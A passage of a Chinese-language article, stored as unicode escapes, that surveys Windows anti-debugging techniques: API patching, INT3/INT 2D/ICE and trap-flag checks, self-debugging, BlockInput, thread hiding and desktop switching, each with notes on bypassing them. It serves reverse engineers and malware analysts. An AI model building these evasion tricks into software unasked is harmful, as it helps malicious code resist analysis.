patch \u68c0\u6d4b\u8c03\u8bd5\u5668\u7684\u4e00\u79cd\u6d41\u884c\u65b9\u6cd5\u662f\u8c03\u7528 kernel32!IsDebuggerPresent() \u3002 \u51cf\u8f7b\u8fd9\u79cd\u68c0\u67e5\u5f88\u7b80\u5355\uff0c\u4f8b\u5982 \u66f4\u6539 EAX \u5bc4\u5b58\u5668\u4e2d\u7684\u7ed3\u679c\u6216\u4fee\u8865 kernel32!IsDebuggerPresent() \u51fd\u6570\u7684\u4ee3\u7801\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u9a8c\u8bc1 kernel32!IsDebuggerPresent() \u662f\u5426\u88ab\u4fee\u6539\uff0c\u800c\u4e0d\u662f\u68c0\u67e5\u8fdb\u7a0b\u5185\u5b58\u4e2d\u7684\u65ad\u70b9\u3002 \u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u8be5\u51fd\u6570\u7684\u524d\u51e0\u4e2a\u5b57\u8282\uff0c\u5e76\u5c06\u5b83\u4eec\u4e0e\u5176\u4ed6\u8fdb\u7a0b\u4e2d\u540c\u4e00\u51fd\u6570\u7684\u8fd9\u4e9b\u5b57\u8282\u8fdb\u884c\u6bd4\u8f83\u3002 \u5373\u4f7f\u542f\u7528\u4e86 ASLR\uff0cWindows \u5e93\u4e5f\u4f1a\u52a0\u8f7d\u5230\u6240\u6709\u8fdb\u7a0b\u4e2d\u7684\u76f8\u540c\u57fa\u5730\u5740\u3002 \u57fa\u5730\u5740\u4ec5\u5728\u91cd\u65b0\u542f\u52a8\u540e\u624d\u4f1a\u66f4\u6539\uff0c\u4f46\u5bf9\u4e8e\u6240\u6709\u8fdb\u7a0b\uff0c\u5b83\u4eec\u5728\u4f1a\u8bdd\u671f\u95f4\u5c06\u4fdd\u6301\u4e0d\u53d8\u3002 Patch ntdll!DbgBreakPoint \u5f53\u8c03\u8bd5\u5668\u9644\u52a0\u5230\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u65f6\u8c03\u7528\u5b83\u3002 \u5b83\u5141\u8bb8\u8c03\u8bd5\u5668\u83b7\u5f97\u63a7\u5236\u6743\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u62e6\u622a\u5f15\u53d1\u7684\u5f02\u5e38\u3002 \u5982\u679c\u6211\u4eec\u5220\u9664 ntdll!DbgBreakPoint() \u5185\u7684\u65ad\u70b9\uff0c\u8c03\u8bd5\u5668\u5c06\u4e0d\u4f1a\u4e2d\u65ad\u5e76\u4e14\u7ebf\u7a0b\u5c06\u9000\u51fa\u3002 Patch ntdll!DbgUiRemoteBreakin \u5f53\u8c03\u8bd5\u5668\u8c03\u7528 kernel32!DebugActiveProcess() \u65f6\uff0c\u76f8\u5e94\u5730\u8c03\u7528 ntdll!DbgUiRemoteBreakin() \u3002 \u4e3a\u4e86\u9632\u6b62\u8c03\u8bd5\u5668Attach\u5230\u8fdb\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u8865 ntdll!DbgUiRemoteBreakin() \u4ee3\u7801\u4ee5\u8c03\u7528 kernel32!TerminateProcess() \u3002 \u6267\u884c\u4ee3\u7801\u6821\u9a8c\u548c \u9a8c\u8bc1\u4ee3\u7801\u6821\u9a8c\u548c\u662f\u68c0\u6d4b\u8f6f\u4ef6\u65ad\u70b9\u3001\u8c03\u8bd5\u5668\u7684\u5355\u6b65\u6267\u884c\u3001\u51fd\u6570\u7684\u5185\u8054\u6302\u94a9\u6216\u6570\u636e\u4fee\u6539\u7684\u53ef\u9760\u65b9\u6cd5\u3002 \u7ed3\u8bba \u8c03\u8bd5\u65f6\uff1a - \u5bf9\u4e8e\u9632\u8de8\u6b65\uff1a\u5355\u6b65\u6267\u884c\u6267\u884c Step-Over \u68c0\u67e5\u7684\u51fd\u6570\u5e76\u6267\u884c\u5230\u6700\u540e\uff08OllyDbg/x32/x64dbg \u4e2d\u4e3a Ctrl+F9\uff09\u3002 - \u7f13\u89e3\u6240\u6709\u201c\u5185\u5b58\u201d\u6280\u5de7\uff08\u5305\u62ec Anti-Step-Over\uff09\u7684\u6700\u4f73\u65b9\u6cd5\u662f\u627e\u5230\u7cbe\u786e\u7684\u68c0\u67e5\u5e76\u4f7f\u7528 NOP \u5bf9\u5176\u8fdb\u884c\u4fee\u8865\uff0c\u6216\u8005\u8bbe\u7f6e\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u8fdb\u4e00\u6b65\u6267\u884c\u7684\u8fd4\u56de\u503c\u3002 \u6c47\u7f16\u6307\u4ee4 \u4ee5\u4e0b\u6280\u672f\u65e8\u5728\u6839\u636e CPU \u6267\u884c\u7279\u5b9a\u6307\u4ee4\u65f6\u8c03\u8bd5\u5668\u7684\u884c\u4e3a\u6765\u68c0\u6d4b\u8c03\u8bd5\u5668\u662f\u5426\u5b58\u5728\u3002 INT 3 \u6307\u4ee4INT3\u662f\u4e00\u4e2a\u4e2d\u65ad\uff0c\u7528\u4f5c\u8f6f\u4ef6\u65ad\u70b9\u3002 \u5982\u679c\u6ca1\u6709\u8c03\u8bd5\u5668\uff0c\u5219\u5728\u5230\u8fbe INT3 \u6307\u4ee4\u540e\uff0c\u4f1a\u751f\u6210\u5f02\u5e38 EXCEPTION_BREAKPOINT (0x80000003) \uff0c\u5e76\u8c03\u7528\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002 \u5982\u679c\u8c03\u8bd5\u5668\u5b58\u5728\uff0c\u5219\u63a7\u5236\u6743\u4e0d\u4f1a\u4ea4\u7ed9\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002 \u9664\u4e86 INT3 \u6307\u4ee4\u7684\u77ed\u5f62\u5f0f\uff080xCC \u64cd\u4f5c\u7801\uff09\u5916\uff0c\u8be5\u6307\u4ee4\u8fd8\u6709\u957f\u5f62\u5f0f\uff1aCD 03 \u64cd\u4f5c\u7801\u3002 \u5f53\u5f02\u5e38 EXCEPTION_BREAKPOINT \u53d1\u751f\u65f6\uff0cWindows \u5c06 EIP \u5bc4\u5b58\u5668\u9012\u51cf\u5230 0xCC \u64cd\u4f5c\u7801\u7684\u5047\u5b9a\u4f4d\u7f6e\uff0c\u5e76\u5c06\u63a7\u5236\u6743\u4f20\u9012\u7ed9\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002 \u5bf9\u4e8e\u957f\u5f62\u5f0f\u7684 INT3 \u6307\u4ee4\uff0cEIP \u5c06\u6307\u5411\u6307\u4ee4\u7684\u4e2d\u95f4\uff08\u5373 0x03 \u5b57\u8282\uff09\u3002 \u56e0\u6b64\uff0c\u5982\u679c\u6211\u4eec\u60f3\u5728 INT3 \u6307\u4ee4\u4e4b\u540e\u7ee7\u7eed\u6267\u884c\uff0c\u5e94\u8be5\u5728\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u4e2d\u7f16\u8f91 EIP\uff08\u5426\u5219\u6211\u4eec\u5f88\u53ef\u80fd\u4f1a\u5f97\u5230 EXCEPTION_ACCESS_VIOLATION \u5f02\u5e38\uff09\u3002 \u5982\u679c\u6ca1\u6709\uff0c\u6211\u4eec\u53ef\u4ee5\u5ffd\u7565\u6307\u4ee4\u6307\u9488\u7684\u4fee\u6539\u3002 INT 2D \u5c31\u50cf INT3 \u6307\u4ee4\u7684\u60c5\u51b5\u4e00\u6837\uff0c\u5f53\u6267\u884c INT2D \u6307\u4ee4\u65f6\uff0c\u4e5f\u4f1a\u5f15\u53d1\u5f02\u5e38 EXCEPTION_BREAKPOINT \u3002 \u4f46\u5bf9\u4e8e INT 2D\uff0cWindows \u4f7f\u7528 EIP \u5bc4\u5b58\u5668\u4f5c\u4e3a\u5f02\u5e38\u5730\u5740\uff0c\u7136\u540e\u9012\u589e EIP \u5bc4\u5b58\u5668\u503c\u3002 \u5728\u6267\u884c INT 2D \u65f6\uff0cWindows \u8fd8\u4f1a\u68c0\u67e5 EAX \u5bc4\u5b58\u5668\u7684\u503c\u3002 \u5982\u679c\u5728\u6240\u6709\u7248\u672c\u7684 Windows \u4e0a\u4e3a 1\u30013 \u6216 4\uff0c\u6216\u8005\u5728 Vista+ \u4e0a\u4e3a 5\uff0c\u5219\u5f02\u5e38\u5730\u5740\u5c06\u52a0 1\u3002 \u8be5\u6307\u4ee4\u53ef\u80fd\u4f1a\u7ed9\u67d0\u4e9b\u8c03\u8bd5\u5668\u5e26\u6765\u95ee\u9898\uff0c\u56e0\u4e3a\u5728 EIP \u653b\u51fb\u540e\uff0cINT2D \u6307\u4ee4\u540e\u9762\u7684\u5b57\u8282\u5c06\u88ab\u8df3\u8fc7\uff0c\u5e76\u4e14\u53ef\u80fd\u4f1a\u4ece\u635f\u574f\u7684\u6307\u4ee4\u7ee7\u7eed\u6267\u884c\u3002 \u5728\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u5728 INT 2D \u4e4b\u540e\u653e\u7f6e\u4e00\u5b57\u8282 NOP \u6307\u4ee4\uff0c\u4ee5\u4fbf\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u8df3\u8fc7\u5b83\u3002 \u5982\u679c\u7a0b\u5e8f\u5728\u6ca1\u6709\u8c03\u8bd5\u5668\u7684\u60c5\u51b5\u4e0b\u6267\u884c\uff0c\u63a7\u5236\u6743\u5c06\u88ab\u4f20\u9012\u7ed9\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002 DebugBreak \u6b63\u5982 DebugBreak \u6587\u6863\u4e2d\u6240\u5199\uff0c\u201cDebugBreak \u4f1a\u5bfc\u81f4\u5f53\u524d\u8fdb\u7a0b\u53d1\u751f\u65ad\u70b9\u5f02\u5e38\u3002 \u8fd9\u5141\u8bb8\u8c03\u7528\u7ebf\u7a0b\u5411\u8c03\u8bd5\u5668\u53d1\u51fa\u4fe1\u53f7\u4ee5\u5904\u7406\u5f02\u5e38\u201d\u3002 \u5982\u679c\u7a0b\u5e8f\u5728\u6ca1\u6709\u8c03\u8bd5\u5668\u7684\u60c5\u51b5\u4e0b\u6267\u884c\uff0c\u63a7\u5236\u6743\u5c06\u88ab\u4f20\u9012\u7ed9\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002 \u5426\u5219\uff0c\u6267\u884c\u5c06\u88ab\u8c03\u8bd5\u5668\u62e6\u622a\u3002 ICE \u201cICE\u201d\u662f\u82f1\u7279\u5c14\u672a\u8bb0\u5f55\u7684\u6307\u4ee4\u4e4b\u4e00\u3002 \u5176\u64cd\u4f5c\u7801\u662f0xF1\u3002 \u5b83\u53ef\u4ee5\u7528\u6765\u68c0\u6d4b\u7a0b\u5e8f\u662f\u5426\u88ab\u8ddf\u8e2a\u3002 \u5982\u679c\u6267\u884c ICE \u6307\u4ee4\uff0c\u5c06\u5f15\u53d1 EXCEPTION_SINGLE_STEP (0x80000004) \u5f02\u5e38\u3002 \u7136\u800c\uff0c\u5982\u679c\u7a0b\u5e8f\u5df2\u7ecf\u88ab\u8ddf\u8e2a\uff0c\u8c03\u8bd5\u5668\u5c06\u8ba4\u4e3a\u8be5\u5f02\u5e38\u662f\u901a\u8fc7\u6267\u884c\u6807\u5fd7\u5bc4\u5b58\u5668\u4e2d\u8bbe\u7f6e\u4e86 SingleStep \u4f4d\u7684\u6307\u4ee4\u800c\u751f\u6210\u7684\u6b63\u5e38\u5f02\u5e38\u3002 \u56e0\u6b64\uff0c\u5728\u8c03\u8bd5\u5668\u4e0b\uff0c\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u4e0d\u4f1a\u88ab\u8c03\u7528\uff0c\u5e76\u4e14\u4f1a\u5728 ICE \u6307\u4ee4\u4e4b\u540e\u7ee7\u7eed\u6267\u884c\u3002 \u6808\u5e27\u5bc4\u5b58\u5668 \u8fd9\u662f\u4e00\u4e2a\u53ef\u4ee5\u7528\u6765\u68c0\u6d4b\u7a0b\u5e8f\u662f\u5426\u88ab\u8ddf\u8e2a\u7684\u6280\u5de7\u3002 \u8be5\u6280\u5de7\u5305\u62ec\u8ddf\u8e2a\u4ee5\u4e0b\u6c47\u7f16\u6307\u4ee4\u5e8f\u5217\uff1a push ss pop ss pushf \u901a\u8fc7\u6b64\u4ee3\u7801\u5728\u8c03\u8bd5\u5668\u4e2d\u5355\u6b65\u6267\u884c\u540e\uff0c\u5c06\u8bbe\u7f6e\u9677\u9631\u6807\u5fd7\u3002 \u901a\u5e38\u5b83\u662f\u4e0d\u53ef\u89c1\u7684\uff0c\u56e0\u4e3a\u8c03\u8bd5\u5668\u5728\u6bcf\u4e2a\u8c03\u8bd5\u5668\u4e8b\u4ef6\u4f20\u9012\u540e\u90fd\u4f1a\u6e05\u9664\u9677\u9631\u6807\u5fd7\u3002 \u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u4e4b\u524d\u5c06 EFLAGS \u4fdd\u5b58\u5230\u5806\u6808\u4e2d\uff0c\u6211\u4eec\u5c06\u80fd\u591f\u68c0\u67e5\u9677\u9631\u6807\u5fd7\u662f\u5426\u5df2\u8bbe\u7f6e\u3002 \u6307\u4ee4\u8ba1\u6570 \u8fd9\u79cd\u6280\u672f\u6ee5\u7528\u4e86\u4e00\u4e9b\u8c03\u8bd5\u5668\u5904\u7406 EXCEPTION_SINGLE_STEP \u5f02\u5e38\u7684\u65b9\u5f0f\u3002 \u8fd9\u4e2a\u6280\u5de7\u7684\u60f3\u6cd5\u662f\u6309\u7167\u67d0\u4e2a\u9884\u5b9a\u4e49\u7684\u5e8f\u5217\uff08\u4f8b\u5982 NOP \u5e8f\u5217\uff09\u4e3a\u6bcf\u6761\u6307\u4ee4\u8bbe\u7f6e\u786c\u4ef6\u65ad\u70b9\u3002 \u6267\u884c\u5e26\u6709\u786c\u4ef6\u65ad\u70b9\u7684\u6307\u4ee4\u4f1a\u5f15\u53d1 EXCEPTION_SINGLE_STEP \u5f02\u5e38\uff0c\u8be5\u5f02\u5e38\u53ef\u4ee5\u7531\u5411\u91cf\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u6355\u83b7\u3002 \u5728\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u589e\u52a0\u4e00\u4e2a\u5bc4\u5b58\u5668\uff0c\u8be5\u5bc4\u5b58\u5668\u5145\u5f53\u6307\u4ee4\u8ba1\u6570\u5668\uff08\u5728\u672c\u4f8b\u4e2d\u4e3a EAX\uff09\u548c\u6307\u4ee4\u6307\u9488 EIP\uff0c\u4ee5\u5c06\u63a7\u5236\u6743\u4f20\u9012\u7ed9\u5e8f\u5217\u4e2d\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u3002 \u56e0\u6b64\uff0c\u6bcf\u6b21\u5c06\u63a7\u5236\u6743\u4f20\u9012\u5230\u5e8f\u5217\u4e2d\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u65f6\uff0c\u90fd\u4f1a\u5f15\u53d1\u5f02\u5e38\u5e76\u4e14\u8ba1\u6570\u5668\u4f1a\u9012\u589e\u3002 \u5e8f\u5217\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u68c0\u67e5\u8ba1\u6570\u5668\uff0c\u5982\u679c\u5b83\u4e0d\u7b49\u4e8e\u5e8f\u5217\u7684\u957f\u5ea6\uff0c\u6211\u4eec\u5c31\u8ba4\u4e3a\u7a0b\u5e8f\u6b63\u5728\u8c03\u8bd5\u3002 POPF and Trap Flag \u8fd9\u662f\u53e6\u4e00\u4e2a\u53ef\u4ee5\u6307\u793a\u7a0b\u5e8f\u662f\u5426\u6b63\u5728\u88ab\u8ddf\u8e2a\u7684\u6280\u5de7\u3002 \u6807\u5fd7\u5bc4\u5b58\u5668\u4e2d\u6709\u4e00\u4e2a\u9677\u9631\u6807\u5fd7\u3002 \u8bbe\u7f6e\u9677\u9631\u6807\u5fd7\u540e\uff0c\u5c06\u5f15\u53d1\u5f02\u5e38 SINGLE_STEP \u3002 \u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u8ddf\u8e2a\u4ee3\u7801\uff0c\u9677\u9631\u6807\u5fd7\u5c06\u88ab\u8c03\u8bd5\u5668\u6e05\u9664\uff0c\u56e0\u6b64\u6211\u4eec\u4e0d\u4f1a\u770b\u5230\u5f02\u5e38\u3002 \u6307\u4ee4\u524d\u7f00 \u6b64\u6280\u5de7\u4ec5\u5728\u67d0\u4e9b\u8c03\u8bd5\u5668\u4e2d\u6709\u6548\u3002 \u5b83\u6ee5\u7528\u4e86\u8fd9\u4e9b\u8c03\u8bd5\u5668\u5904\u7406\u6307\u4ee4\u524d\u7f00\u7684\u65b9\u5f0f\u3002 \u5982\u679c\u6211\u4eec\u5728 OllyDbg \u4e2d\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801\uff0c\u5728\u5355\u6b65\u6267\u884c\u5230\u7b2c\u4e00\u4e2a\u5b57\u8282 F3 \u540e\uff0c\u6211\u4eec\u5c06\u7acb\u5373\u5230\u8fbe try \u5757\u7684\u672b\u5c3e\u3002 \u8c03\u8bd5\u5668\u53ea\u662f\u8df3\u8fc7\u524d\u7f00\u5e76\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9 INT1 \u6307\u4ee4\u3002 \u5982\u679c\u6211\u4eec\u5728\u6ca1\u6709\u8c03\u8bd5\u5668\u7684\u60c5\u51b5\u4e0b\u8fd0\u884c\u76f8\u540c\u7684\u4ee3\u7801\uff0c\u5219\u4f1a\u5f15\u53d1\u5f02\u5e38\uff0c\u5e76\u4e14\u6211\u4eec\u5c06\u8fdb\u5165 except \u5757\u3002 \u7ed3\u8bba \u8c03\u8bd5\u65f6\uff1a \u7f13\u89e3\u4ee5\u4e0b\u6240\u6709\u68c0\u67e5\u7684\u6700\u4f73\u65b9\u6cd5\u662f\u4f7f\u7528 NOP \u6307\u4ee4\u4fee\u8865\u5b83\u4eec\u3002 \u5173\u4e8e\u53cd\u8ddf\u8e2a\u6280\u672f\uff1a\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5730\u5728\u68c0\u67e5\u540e\u7684\u4ee3\u7801\u4e2d\u8bbe\u7f6e\u4e00\u4e2a\u65ad\u70b9\uff0c\u7136\u540e\u8fd0\u884c\u7a0b\u5e8f\u76f4\u5230\u8be5\u65ad\u70b9\uff0c\u800c\u4e0d\u662f\u4fee\u8865\u4ee3\u7801\u3002 \u4ea4\u4e92\u5f0f\u68c0\u67e5 \u4ee5\u4e0b\u6280\u672f\u4f7f\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u53ef\u4ee5\u7ba1\u7406\u7528\u6237\u754c\u9762\u6216\u4e0e\u5176\u7236\u8fdb\u7a0b\u4ea4\u4e92\uff0c\u4ee5\u53d1\u73b0\u5df2\u8c03\u8bd5\u8fdb\u7a0b\u56fa\u6709\u7684\u4e0d\u4e00\u81f4\u4e4b\u5904\u3002 \u81ea\u6211\u8c03\u8bd5 \u81f3\u5c11\u6709\u4e09\u4e2a\u51fd\u6570\u53ef\u7528\u4e8e\u4f5c\u4e3a\u8c03\u8bd5\u5668\u9644\u52a0\u5230\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\uff1a - kernel32!DebugActiveProcess() - ntdll!DbgUiDebugActiveProcess() - ntdll!NtDebugActiveProcess() \u7531\u4e8e\u4e00\u6b21\u53ea\u80fd\u5c06\u4e00\u4e2a\u8c03\u8bd5\u5668Attach\u5230\u8fdb\u7a0b\uff0c\u56e0\u6b64\u9644\u52a0\u5230\u8fdb\u7a0b\u5931\u8d25\u53ef\u80fd\u8868\u660e\u5b58\u5728\u53e6\u4e00\u4e2a\u8c03\u8bd5\u5668\u3002 GenerateConsoleCtrlEvent \u5f53\u7528\u6237\u6309\u4e0b Ctrl+C \u6216 Ctrl+Break \u5e76\u4e14\u63a7\u5236\u53f0\u7a97\u53e3\u5904\u4e8e\u7126\u70b9\u65f6\uff0cWindows \u5c06\u68c0\u67e5\u662f\u5426\u6709\u6b64\u4e8b\u4ef6\u7684\u5904\u7406\u7a0b\u5e8f\u3002 \u6240\u6709\u63a7\u5236\u53f0\u8fdb\u7a0b\u90fd\u6709\u4e00\u4e2a\u9ed8\u8ba4\u5904\u7406\u7a0b\u5e8f\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u8c03\u7528 kernel32!ExitProcess() \u51fd\u6570\u3002 \u4f46\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u4e3a\u8fd9\u4e9b\u4e8b\u4ef6\u6ce8\u518c\u4e00\u4e2a\u81ea\u5b9a\u4e49\u5904\u7406\u7a0b\u5e8f\uff0c\u8be5\u5904\u7406\u7a0b\u5e8f\u4f1a\u5ffd\u7565 Ctrl+C \u6216 Ctrl+Break \u4fe1\u53f7\u3002 \u4f46\u662f\uff0c\u5982\u679c\u6b63\u5728\u8c03\u8bd5\u63a7\u5236\u53f0\u8fdb\u7a0b\u5e76\u4e14\u672a\u7981\u7528 CTRL+C \u4fe1\u53f7\uff0c\u7cfb\u7edf\u4f1a\u751f\u6210 DBG_CONTROL_C \u5f02\u5e38\u3002 \u901a\u5e38\u8fd9\u4e2a\u5f02\u5e38\u4f1a\u88ab\u8c03\u8bd5\u5668\u62e6\u622a\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u6ce8\u518c\u4e00\u4e2a\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u6211\u4eec\u5c06\u80fd\u591f\u68c0\u67e5\u662f\u5426\u5f15\u53d1\u4e86 DBG_CONTROL_C \u3002 \u5982\u679c\u6211\u4eec\u5728\u81ea\u5df1\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u4e2d\u62e6\u622a\u5230 DBG_CONTROL_C \u5f02\u5e38\uff0c\u5219\u53ef\u80fd\u8868\u660e\u8be5\u8fdb\u7a0b\u6b63\u5728\u88ab\u8c03\u8bd5\u3002 BlockInput \u51fd\u6570 user32!BlockInput() \u53ef\u4ee5\u963b\u6b62\u6240\u6709\u9f20\u6807\u548c\u952e\u76d8\u4e8b\u4ef6\uff0c\u8fd9\u662f\u7981\u7528\u8c03\u8bd5\u5668\u7684\u975e\u5e38\u6709\u6548\u7684\u65b9\u6cd5\u3002 \u5728 Windows Vista \u53ca\u66f4\u9ad8\u7248\u672c\u4e0a\uff0c\u6b64\u8c03\u7528\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002 \u6211\u4eec\u8fd8\u53ef\u4ee5\u68c0\u6d4b\u662f\u5426\u5b58\u5728\u6302\u94a9 user32!BlockInput() \u548c\u5176\u4ed6\u53cd\u8c03\u8bd5\u8c03\u7528\u7684\u5de5\u5177\u3002 \u8be5\u529f\u80fd\u5141\u8bb8\u8f93\u5165\u4ec5\u88ab\u963b\u6b62\u4e00\u6b21\u3002 \u7b2c\u4e8c\u6b21\u8c03\u7528\u5c06\u8fd4\u56de FALSE\u3002 \u5982\u679c\u65e0\u8bba\u8f93\u5165\u5982\u4f55\u8be5\u51fd\u6570\u90fd\u8fd4\u56de TRUE\uff0c\u5219\u53ef\u80fd\u8868\u660e\u5b58\u5728\u67d0\u79cd\u6302\u94a9\u89e3\u51b3\u65b9\u6848\u3002 NtSetInformationThread \u51fd\u6570 ntdll!NtSetInformationThread() \u53ef\u7528\u4e8e\u5bf9\u8c03\u8bd5\u5668\u9690\u85cf\u7ebf\u7a0b\u3002 \u501f\u52a9\u672a\u8bb0\u5f55\u7684\u503c THREAD_INFORMATION_CLASS::ThreadHideFromDebugger (0x11) \u662f\u53ef\u80fd\u7684\u3002 \u8fd9\u662f\u4f9b\u5916\u90e8\u8fdb\u7a0b\u4f7f\u7528\u7684\uff0c\u4f46\u4efb\u4f55\u7ebf\u7a0b\u90fd\u53ef\u4ee5\u5728\u81ea\u8eab\u4e0a\u4f7f\u7528\u5b83\u3002 \u7ebf\u7a0b\u5bf9\u8c03\u8bd5\u5668\u9690\u85cf\u540e\uff0c\u5b83\u5c06\u7ee7\u7eed\u8fd0\u884c\uff0c\u4f46\u8c03\u8bd5\u5668\u4e0d\u4f1a\u63a5\u6536\u4e0e\u8be5\u7ebf\u7a0b\u76f8\u5173\u7684\u4e8b\u4ef6\u3002 \u8be5\u7ebf\u7a0b\u53ef\u4ee5\u6267\u884c\u53cd\u8c03\u8bd5\u68c0\u67e5\uff0c\u4f8b\u5982\u4ee3\u7801\u6821\u9a8c\u548c\u3001\u8c03\u8bd5\u6807\u5fd7\u9a8c\u8bc1\u7b49\u3002 \u4f46\u662f\uff0c\u5982\u679c\u9690\u85cf\u7ebf\u7a0b\u4e2d\u6709\u65ad\u70b9\u6216\u8005\u6211\u4eec\u5bf9\u8c03\u8bd5\u5668\u9690\u85cf\u4e3b\u7ebf\u7a0b\uff0c\u5219\u8fdb\u7a0b\u5c06\u5d29\u6e83\u5e76\u4e14\u8c03\u8bd5\u5668\u5c06\u88ab\u5361\u4f4f\u3002 \u5728\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u5bf9\u8c03\u8bd5\u5668\u9690\u85cf\u5f53\u524d\u7ebf\u7a0b\u3002 \u8fd9\u610f\u5473\u7740\uff0c\u5982\u679c\u6211\u4eec\u5728\u8c03\u8bd5\u5668\u4e2d\u8ddf\u8e2a\u8fd9\u6bb5\u4ee3\u7801\uff0c\u6216\u8005\u5728\u8be5\u7ebf\u7a0b\u7684\u4efb\u4f55\u6307\u4ee4\u4e0a\u8bbe\u7f6e\u65ad\u70b9\uff0c\u4e00\u65e6\u8c03\u7528 ntdll!NtSetInformationThread() \uff0c\u8c03\u8bd5\u5c31\u4f1a\u88ab\u5361\u4f4f\u3002 EnumWindows and SuspendThread \u8be5\u6280\u672f\u7684\u601d\u60f3\u662f\u6302\u8d77\u7236\u8fdb\u7a0b\u7684\u6240\u5c5e\u7ebf\u7a0b\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u9a8c\u8bc1\u7236\u8fdb\u7a0b\u662f\u5426\u662f\u8c03\u8bd5\u5668\u3002 \u8fd9\u53ef\u4ee5\u901a\u8fc7\u679a\u4e3e\u5c4f\u5e55\u4e0a\u7684\u6240\u6709\u9876\u7ea7\u7a97\u53e3\uff08\u4f7f\u7528 user32!EnumWindows() \u6216 user32!EnumThreadWindows() \uff0c\u641c\u7d22\u8fdb\u7a0b ID \u4e3a\u7236\u8fdb\u7a0b ID \u7684\u7a97\u53e3\uff08\u4f7f\u7528 user32!GetWindowThreadProcessId() \u6765\u5b9e\u73b0\uff09 \uff09\uff0c\u5e76\u68c0\u67e5\u8be5\u7a97\u53e3\u7684\u6807\u9898\uff08\u901a\u8fc7 user32!GetWindowTextW()\uff09\u3002 \u5982\u679c\u7236\u8fdb\u7a0b\u7684\u7a97\u53e3\u6807\u9898\u770b\u8d77\u6765\u50cf\u8c03\u8bd5\u5668\u6807\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 kernel32!SuspendThread() \u6216 ntdll!NtSuspendThread() \u6302\u8d77\u6240\u5c5e\u7ebf\u7a0b\u3002 SwitchDesktop Windows \u652f\u6301\u6bcf\u4e2a\u4f1a\u8bdd\u591a\u4e2a\u684c\u9762\u3002 \u53ef\u4ee5\u9009\u62e9\u4e0d\u540c\u7684\u6d3b\u52a8\u684c\u9762\uff0c\u8fd9\u5177\u6709\u9690\u85cf\u5148\u524d\u6d3b\u52a8\u684c\u9762\u7684\u7a97\u53e3\u7684\u6548\u679c\uff0c\u5e76\u4e14\u6ca1\u6709\u660e\u663e\u7684\u65b9\u6cd5\u53ef\u4ee5\u5207\u6362\u56de\u65e7\u684c\u9762\u3002 \u6b64\u5916\uff0c\u6765\u81ea\u88ab\u8c03\u8bd5\u8fdb\u7a0b\u684c\u9762\u7684\u9f20\u6807\u548c\u952e\u76d8\u4e8b\u4ef6\u5c06\u4e0d\u518d\u4f20\u9012\u5230\u8c03\u8bd5\u5668\uff0c\u56e0\u4e3a\u5b83\u4eec\u7684\u6e90\u4e0d\u518d\u5171\u4eab\u3002 \u8fd9\u663e\u7136\u4f7f\u5f97\u8c03\u8bd5\u53d8\u5f97\u4e0d\u53ef\u80fd\u3002 OutputDebugString \u6b64\u6280\u672f\u5df2\u88ab\u5f03\u7528\uff0c\u56e0\u4e3a\u5b83\u4ec5\u9002\u7528\u4e8e Vista \u4e4b\u524d\u7684 Windows \u7248\u672c\u3002 \u7136\u800c\uff0c\u8fd9\u9879\u6280\u672f\u4f17\u6240\u5468\u77e5\uff0c\u56e0\u6b64\u5728\u6b64\u4e0d\u4e88\u63d0\u53ca\u3002 \u8fd9\u4e2a\u60f3\u6cd5\u5f88\u7b80\u5355\u3002 \u5982\u679c\u8c03\u8bd5\u5668\u4e0d\u5b58\u5728\u5e76\u4e14\u8c03\u7528\u4e86 kernel32!OutputDebugString \uff0c\u5219\u4f1a\u53d1\u751f\u9519\u8bef\u3002 \u7ed3\u8bba \u5728\u8c03\u8bd5\u8fc7\u7a0b\u4e2d\uff0c\u6700\u597d\u8df3\u8fc7\u53ef\u7591\u7684\u51fd\u6570\u8c03\u7528\uff08\u4f8b\u5982\u7528 NOP \u586b\u5145\u5b83\u4eec\uff09\u3002 \u5982\u679c\u4f60\u5199\u4e00\u4e2a\u53cd\u53cd\u8c03\u8bd5\u65b9\u6848\uff0c\u4ee5\u4e0b\u6240\u6709\u51fd\u6570\u90fd\u53ef\u4ee5\u88abhook\uff1a kernel32!DebugActiveProcess ntdll!DbgUiDebugActiveProcess ntdll!NtDebugActiveProcess kernel32!GenerateConsoleCtrlEvent() user32!NtUserBlockInput ntdll!NtSetInformationThread user32!NtUserBuildHwndList\uff08\u7528\u4e8e\u8fc7\u6ee4 EnumWindows \u8f93\u51fa\uff09 kernel32!SuspendThread user32!SwitchDesktop 